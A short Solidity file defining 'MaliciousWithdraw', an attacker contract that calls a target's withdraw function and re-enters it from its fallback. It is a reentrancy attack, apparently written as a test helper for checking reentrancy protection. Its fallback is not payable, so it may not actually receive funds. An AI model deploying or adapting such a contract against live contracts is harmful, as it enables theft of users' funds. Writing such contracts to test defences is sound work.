// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract MaliciousWithdraw {
    address public target;
    bool internal attackInitiated;

    constructor(address _target) {
        target = _target;
    }

    function attack(uint256 amount) external {
        attackInitiated = true;
        (bool success, ) = target.call(abi.encodeWithSignature("withdraw(uint256)", amount));
        require(success, "Attack failed");
        attackInitiated = false;
    }

    fallback() external {
        if (attackInitiated) {
            (bool success, ) = target.call(abi.encodeWithSignature("withdraw(uint256)", 1 ether));
            require(success, "Reentrant call failed");
        }
    }
}